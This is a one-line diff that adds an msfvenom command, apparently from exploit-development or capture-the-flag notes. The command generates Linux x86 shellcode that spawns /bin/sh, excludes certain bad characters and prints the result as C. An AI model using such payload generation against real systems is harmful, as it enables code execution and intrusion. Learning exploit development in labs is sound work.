@@ -1,0 +1,1 @@
+✎ $ msfvenom -p linux/x86/exec CMD='/bin/sh' -b 'shfg*|`' -f c
